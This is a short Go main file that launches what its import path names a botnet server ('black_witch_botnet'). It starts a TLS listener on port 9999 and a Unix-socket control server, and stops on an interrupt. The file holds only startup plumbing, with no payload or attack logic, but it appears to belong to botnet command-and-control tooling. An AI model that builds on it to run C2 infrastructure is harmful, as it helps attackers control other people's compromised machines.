package main

import (
	"black_witch_botnet/server"
	"context"
	"flag"
	"fmt"
	"os"
	"os/signal"
)

func main() {
	acceptAddr := flag.String("addr-accept", ":9999", "Server address")
	controlSock := flag.String("sock-control", "../../tmp/unix.sock", "Control address")
	cert := flag.String("cert", "../../crypt/server.crt", "Server tls cert")
	key := flag.String("key", "../../crypt/server.key", "Server tls key")
	flag.Parse()

	s := &server.AcceptServer{
		Addr: *acceptAddr,
		Cert: *cert,
		Key:  *key,
	}

	c := &server.ControlServer{
		Sock: *controlSock,
	}

	r := &server.Runner{
		Accept:  s,
		Control: c,
	}

	ctx := context.Background()
	ctx, cancel := context.WithCancel(ctx)

	i := make(chan os.Signal)
	signal.Notify(i, os.Interrupt)

	defer func() {
		signal.Stop(i)
		cancel()
	}()

	go func() {
		select {
		case sig := <-i:
			fmt.Printf("Got %s signal. Aborting...\n", sig)
			cancel()
		case <-ctx.Done():
		}
	}()

	r.Run(ctx)
}
